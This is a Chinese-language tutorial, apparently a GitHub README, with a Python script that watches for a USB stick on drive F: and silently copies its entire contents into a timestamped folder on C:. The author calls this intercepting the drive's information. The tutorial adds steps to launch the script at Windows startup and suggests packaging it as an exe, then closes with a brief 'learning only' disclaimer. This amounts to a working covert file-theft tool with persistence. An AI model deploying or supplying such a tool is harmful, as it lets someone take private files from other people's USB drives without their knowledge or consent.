# -此程序会检测U盘的存在，并将其信息拷贝到设置位置-
此程序会检测U盘的存在，并将其信息拷贝到设置位置
​
注意：要明确u盘插入后所在的盘符是哪个，在此项目中，以我的U盘盘符为F盘为例

首先导入所需模块包：

import os
import datetime
import shutil

定义主程序：

def main():
    now = datetime.datetime.now()
    # 用时间命名文件
    year = str(now.year)
    month = str(now.month)
    day = str(now.day)
    hour = str(now.hour)
    minute = str(now.minute)
    second = str(now.second)

    time = year + '_' + month + '_' + day + '_' + hour + '_' + minute + '_' + second

    locals = "C:\\" + time

    shutil.copytree('F:/', locals) #第一个参数明确u盘盘符
    # 前面是源文件，后面是你想要的复制到的目录
    print("————————爬取完成————————")

爬取到的U盘信息会归纳到一个文件夹中

在此程序中，首先获取当前时间，用当前时间为为文件夹命名，然后保存在c盘主目录当中，如果不想保存在c盘，把第11行中“ locals = "C:\\" + time ”的”c“改为想要的盘符即可

下面写U盘状态的判断，以用来触发爬取程序：

sign = True # 程序开关
while True:
    pan = os.path.exists("F:") # 验证u盘状态，False：未存在 Ture：存在

    if pan == True and sign == True:
        print('U盘运行中,准备截留')
        sign = False
        # 为避免多次爬取，在爬取前将开关关闭，等到下一次循环至此if语句是选择跳过
        main() # 执行
    if pan == False:
        print('未识别到U盘')
        sign = True
        # 开关打开，为新识别出的u盘做爬取准备

首先我定义了一个sign布尔变量，用来当作爬取程序的开关，然后进入循环，os.path.exists("F:")会先检测U盘的状态，如果存在，返回Ture反之返回False。

如果判定U盘存在，调用main函数，如果没有U盘，则会一直检查，直到发现为止

需要注意：如果在信息截留过程中将U盘强制拔出，会导致程序直接崩溃，所以建议等信息截留完成时再拔掉U盘，或者套用try函数。

如果想要将此程序设置为开机自启，可执行以下操作：

win + r 打开控制台，输入：shell:startup
![image](https://github.com/user-attachments/assets/430ffe37-0b67-48e8-9358-9709685abfae)


回车进入启动项文件夹，将程序文件放置此处

建议将程序打包为exe文件后放入，打包exe在这里就不做教程了

最后奉劝大家合理合法利用爬取到的信息，切勿用于非法行为。此项目只有交流学习之用。

求打赏

​
